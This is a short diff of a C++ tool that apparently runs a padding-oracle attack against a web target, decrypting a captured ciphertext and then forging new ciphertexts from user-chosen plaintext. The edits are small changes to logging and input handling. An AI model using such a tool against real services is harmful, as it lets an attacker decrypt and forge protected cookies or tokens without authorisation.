@@ -55,6 +55,7 @@ void worker(
         CURL* curl = CurlInit();
         if (Target::getMethod() == GET) {
             requestFunc = [&curl](std::string& msg) {
+                //Log::print("GET Request Payload: " + Target::getPayload(msg));
                 return GetRequest(curl, Target::getPayload(msg));
             };
         } else if (Target::getMethod() == COOKIES) {
@@ -162,8 +163,9 @@ int main(int argc, char* argv[]) {
 
     Log::bingo("Decrypted message: " + msg);
 
-    // Log::info("Saving results in saves/");
-    // saveResult(cypherDataList, Target::getUrl());
+    //Log::info("Saving results in saves/");
+    //saveResult(cypherDataList, Target::getUrl());
+
 
     // ask to encrypt a chosen message
     std::string userInput;
@@ -173,15 +175,16 @@ int main(int argc, char* argv[]) {
 
     while (true) {
         Log::print("Do you want to craft a custom cypher? Enter your plaintext or type 'q' to quit: ");
-        std::cin >> userInput;
+        std::getline(std::cin, userInput);
         
         if (userInput == "q") {
             Log::print("Bye");
             break;
         }
-
+        
         plainSize = userInput.size();
         nBlocksNeeded = (plainSize + Target::getBlockSize() - 1) / Target::getBlockSize();
+        
         if (nBlocksNeeded < nBlocks) {
             newCipher = BuildCipherFromPlain(userInput, cypherDataList, blocks[nBlocksNeeded], nBlocksNeeded, plainSize);
             Log::bingo("New cypher text: " + newCipher);
